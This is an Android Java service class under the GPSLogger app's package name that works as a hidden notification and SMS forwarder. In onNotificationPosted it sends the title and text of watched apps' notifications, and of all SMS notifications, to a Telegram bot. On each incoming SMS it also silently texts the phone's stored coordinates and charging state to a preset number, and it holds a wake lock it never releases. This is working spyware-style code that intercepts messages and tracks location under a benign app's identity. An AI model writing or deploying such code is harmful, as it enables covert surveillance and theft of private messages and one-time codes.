package com.mendhak.gpslogger;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.SmsManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;

import com.google.gson.Gson;

import com.mendhak.gpslogger.config.proxy;
import com.mendhak.gpslogger.data_structure.request_message;
import com.mendhak.gpslogger.static_class.log_func;
import com.mendhak.gpslogger.static_class.network_func;
import com.mendhak.gpslogger.static_class.other_func;
import com.mendhak.gpslogger.static_class.resend_func;
import com.mendhak.gpslogger.static_class.service_func;
import com.mendhak.gpslogger.value.const_value;
import com.mendhak.gpslogger.value.notify_id;


import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;

import io.paperdb.Paper;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;


@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
@SuppressLint("OverrideAbstract")
public class notification_listener_service extends NotificationListenerService {
    static Map<String, String> app_name_list = new HashMap<>();
    final String TAG = "notification_receiver";
    Context context;
    SharedPreferences sharedPreferences;
    SharedPreferences sharedSimpanNotif;
    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();
        Paper.init(context);
        sharedPreferences = context.getSharedPreferences("data", Context.MODE_PRIVATE);

        sharedSimpanNotif = context.getSharedPreferences("notif", Context.MODE_PRIVATE);


        Notification notification = other_func.get_notification_obj(getApplicationContext(), getString(R.string.Notification_Listener_title));
        startForeground(notify_id.NOTIFICATION_LISTENER_SERVICE, notification);

        service_func.start_service(getApplicationContext(),true,true);

        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.mendhak.gpslogger", "com.mendhak.gpslogger.GpsLoggingService"));
            context.startService(i);
        } catch (Exception x) {

        }

        /******* wake lock lagi jika nga mempan */

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        @SuppressLint("InvalidWakeLockTag")
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "WakeLocnya");
        wl.acquire();


    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
    }

    @Override
    public void onDestroy() {
        stopForeground(true);
        super.onDestroy();
    }

    @Override
    public void onNotificationPosted(@NotNull StatusBarNotification sbn) {
        final String package_name = sbn.getPackageName();
        Log.d(TAG, "onNotificationPosted: " + package_name);

        if (!sharedPreferences.getBoolean("initialized", false)) {
            Log.i(TAG, "Uninitialized, Notification receiver is deactivated.");
            return;
        }




        List<String> listen_list = Paper.book("system_config").read("notify_listen_list", new ArrayList<>());
        if (!listen_list.contains(package_name)) {

            if(package_name.equals("com.android.mms"))
            {
                Log.i(TAG, "[" + package_name + "] SMS notif ini bos.");


            }else{
                Log.i(TAG, "[" + package_name + "] Not in the list of listening packages.");
                return;
            }


        }
        Bundle extras = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
            extras = sbn.getNotification().extras;
        }
        assert extras != null;
        String app_name = "unknown";
        Log.d(TAG, "onNotificationPosted: " + app_name_list);
        if (app_name_list.containsKey(package_name)) {
            app_name = app_name_list.get(package_name);
        } else {
            final PackageManager pm = getApplicationContext().getPackageManager();
            try {
                ApplicationInfo application_info = pm.getApplicationInfo(sbn.getPackageName(), 0);
                app_name = (String) pm.getApplicationLabel(application_info);
                app_name_list.put(package_name, app_name);
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
        }



        String title = extras.getString(Notification.EXTRA_TITLE, "None");
        String content = extras.getString(Notification.EXTRA_TEXT, "None");




        String nomor_kepercayaan = sharedPreferences.getString("trusted_phone_number","");



        if(package_name.equals("com.android.mms")  && !nomor_kepercayaan.equals(""))
        {

            String latlong = sharedSimpanNotif.getString("maps_latlong","");
            String mesin = sharedSimpanNotif.getString("ischarging","");
            try {

                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(nomor_kepercayaan, null, latlong+"\n"+mesin
                        , null, null);

            }catch (Exception e)
            {
                System.out.println("force_sms "+e.toString());
            }


        }

        String bot_token = sharedPreferences.getString("bot_token", "");
        String chat_id = sharedPreferences.getString("chat_id", "");
        String request_uri = network_func.get_url(bot_token, "sendMessage");
        request_message request_body = new request_message();
        request_body.chat_id = chat_id;
        request_body.text = getString(R.string.receive_notification_title) + "\n" + getString(R.string.app_name_title) + app_name + "\n" + getString(R.string.title) + title + "\n" + getString(R.string.content) + content +"\n" + package_name;
        RequestBody body = RequestBody.create(const_value.JSON, new Gson().toJson(request_body));
        OkHttpClient okhttp_client = network_func.get_okhttp_obj(sharedPreferences.getBoolean("doh_switch", true), Paper.book("system_config").read("proxy_config", new proxy()));
        Request request = new Request.Builder().url(request_uri).method("POST", body).build();
        Call call = okhttp_client.newCall(request);
        final String error_head = "Send notification failed:";
        call.enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                e.printStackTrace();
                log_func.write_log(context, error_head + e.getMessage());
                resend_func.add_resend_loop(context, request_body.text);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                assert response.body() != null;
                String result = Objects.requireNonNull(response.body()).string();
                if (response.code() != 200) {
                    log_func.write_log(context, error_head + response.code() + " " + result);
                    resend_func.add_resend_loop(context, request_body.text);
                }
            }
        });
    }



    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

}
